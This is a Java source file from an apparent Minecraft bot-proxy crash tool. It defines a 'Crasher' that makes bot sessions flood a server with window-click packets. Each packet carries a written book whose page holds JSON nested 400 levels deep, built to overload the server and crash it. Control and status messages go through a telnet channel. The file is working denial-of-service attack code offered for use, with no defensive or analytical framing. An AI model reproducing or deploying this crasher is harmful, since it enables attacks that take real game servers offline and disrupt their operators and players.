package us.whitedev.proxy.function.crashers.impl;

import org.spacehq.mc.protocol.data.game.ItemStack;
import org.spacehq.mc.protocol.data.game.values.window.ClickItemParam;
import org.spacehq.mc.protocol.data.game.values.window.WindowAction;
import org.spacehq.mc.protocol.packet.ingame.client.window.ClientWindowActionPacket;
import org.spacehq.opennbt.tag.builtin.ByteTag;
import org.spacehq.opennbt.tag.builtin.CompoundTag;
import org.spacehq.opennbt.tag.builtin.ListTag;
import org.spacehq.opennbt.tag.builtin.StringTag;
import us.whitedev.proxy.function.crashers.Crasher;
import us.whitedev.proxy.telnet.Channels;
import us.whitedev.proxy.telnet.TelnetInit;

public class TestMethod implements Crasher {

    private final String name = "TestMethod";

    @Override
    public boolean check(String string) {
        return string.equalsIgnoreCase(name);
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public void onMethod(String name, int packets) {
        TelnetInit.sendMessageToUsers(Channels.MESSAGE + "Sending packets &8(&f" + getName()
                .toUpperCase() + "&8) &8[&f" + packets + "&8]");
        new Thread(() -> {
            for (int i = 0; i < packets; ++i) {
                for (int j = 0; j < session.getSelectedUsers().length; j++) {
                    if (session.getSelectedUsers()[j] != null) {
                        session.getSelectedUsers()[j].getSession().send(new ClientWindowActionPacket(0, 0, 1, createItemStack(), WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
                    }
                }
            }
        }).start();
        TelnetInit.sendMessageToUsers(Channels.MESSAGE + "Packets has been sent by &fbots!");
    }

    @Override
    public ItemStack createItemStack() {
        final ListTag pages = new ListTag("pages", StringTag.class);

        for (int i = 0; i < 1; ++i)
            pages.add(new StringTag("pages", generateJson(400)));

        final CompoundTag nbt = new CompoundTag("tag");

        nbt.put(new ByteTag("resolved", (byte) 1));
        nbt.put(pages);
        nbt.put(new StringTag("author", "dupa"));
        nbt.put(new StringTag("title", "hejo co tam"));
        return new ItemStack(386, 1, 0, nbt);
    }

    public static String generateJson(final int levels) {
        StringBuilder value = new StringBuilder();
        value.append("{");

        for (int i = 0; i < levels; ++i) {
            value.append("extra:[{");
        }
        for (int i = 0; i < levels; ++i) {
            value.append("text:b}],");
        }
        value.append("text:b}");

        return value.toString();
    }
}
